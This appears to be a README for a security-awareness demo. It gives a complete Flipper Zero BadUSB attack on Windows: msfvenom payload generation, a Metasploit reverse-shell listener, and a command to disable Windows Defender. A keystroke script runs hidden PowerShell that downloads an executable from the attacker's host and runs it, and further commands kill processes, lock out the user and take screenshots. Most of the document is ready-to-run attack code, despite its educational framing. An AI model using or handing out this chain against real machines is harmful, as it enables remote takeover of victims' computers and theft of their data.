# FlipperZero_Metasploit_Demo

## Overview

This demo showcases a simulated USB drop attack using **Flipper Zero** with a **BadUSB payload**, delivering a **reverse Meterpreter shell** to a Kali Linux machine and executing a GUI-based post-exploitation effect on the target Windows system. The objective is to raise awareness among non-technical audiences about how seemingly harmless USB devices can lead to complete system compromise.

The payload includes a reverse shell, custom ASCII art, and a Notepad popup that reinforces the impact — all executed with zero user interaction beyond the USB plug-in.

---

## 🖥️ Hardware & Tools Required

* **Flipper Zero** (with BadUSB functionality enabled)
* **Kali Linux VM** (tested on 2025.2)
* **Windows 10/11 VM** (with Windows Defender disabled)
* VirtualBox / VMware / Hyper-V or similar hypervisor
* Internet access (for initial setup only)

---

## ⚙️ Setup Instructions

### 1. Kali Linux Setup

**Install Metasploit (if not installed):**

```bash
sudo apt update && sudo apt install metasploit-framework -y
```

**Generate payload (only once):**

```bash
msfvenom -p windows/meterpreter/reverse_http LHOST=<KALI_IP> LPORT=8080 -f exe -o payload.exe
```

Place `payload.exe` in a folder named `web_payload` and start a web server:

```bash
cd web_payload
python3 -m http.server 80
```

**Start Metasploit listener:**

```bash
msfconsole
```

```msf
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_http
set LHOST <KALI_IP>
set LPORT 8080
set ExitOnSession false
exploit -j
```

---

### 2. Windows VM Setup

* Disable Windows Defender:

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

* Ensure Windows and Kali VMs are on the same network (bridged or host-only).
* Note your Kali IP address using `ip a` or `ipconfig`.

---

### 3. Flipper Zero Script

Upload the following BadUSB script to your Flipper:

```txt
DELAY 1000
GUI r
DELAY 1000
STRING powershell
ENTER
DELAY 1500
STRING powershell -w hidden -nop -Command "iwr http://<KALI_IP>/payload.exe -OutFile $env:TEMP\payload.exe; Start-Process $env:TEMP\payload.exe"
ENTER
```

Replace `<KALI_IP>` with your Kali VM’s IP address.

---

## 🎯 How the Demo Works

1. Flipper types the PowerShell command that fetches and executes the payload.
2. Metasploit listener on Kali receives the reverse shell.
3. You gain a Meterpreter session and can interact with the target system.
4. For dramatic effect, Notepad opens with custom ASCII art and a scary message.

---

## 🎭 Visual Payload (Post-Exploitation)

Once session is active, run:

```msf
execute -f cmd.exe -a "/c tskill explorer & tskill chrome & timeout /t 1 >nul & echo   ░▒▓███████▓▒░   > %TEMP%\pwned.txt && echo ░▒▓██ YOU'VE BEEN ██▓▒░ >> %TEMP%\pwned.txt && echo   ░▒▓███  PWNED  ███▓▒░ >> %TEMP%\pwned.txt && echo     ░▒▓█████████▓▒░ >> %TEMP%\pwned.txt && echo. >> %TEMP%\pwned.txt && echo  Your system belongs to us... >> %TEMP%\pwned.txt && echo  Resistance is futile. >> %TEMP%\pwned.txt && echo  ▄︻̷̿┻̿═━一 💀💀💀💀💀 >> %TEMP%\pwned.txt && start notepad %TEMP%\pwned.txt"
```

---

## 💡 Optional Enhancements

* **Lock Input:**

```msf
run post/windows/manage/lockout_user
```

* **Take Screenshot:**

```msf
screenshot
```

---

## 🔁 Reproducibility Notes

* Use a fixed payload filename (like `payload.exe`) to avoid changing Flipper scripts.
* Network setup must ensure Windows can reach the Kali-hosted HTTP server.
* Metasploit must be started before payload is executed.

---

## 📌 Educational Purpose Only

This demo is intended solely for security awareness training within controlled environments. Never attempt this on unauthorized systems.

---

## 📷 Screenshots

* Reverse shell connection shown in Metasploit
* Notepad popup with ASCII message on Windows VM

---

## ✅ Status

Demo verified

---
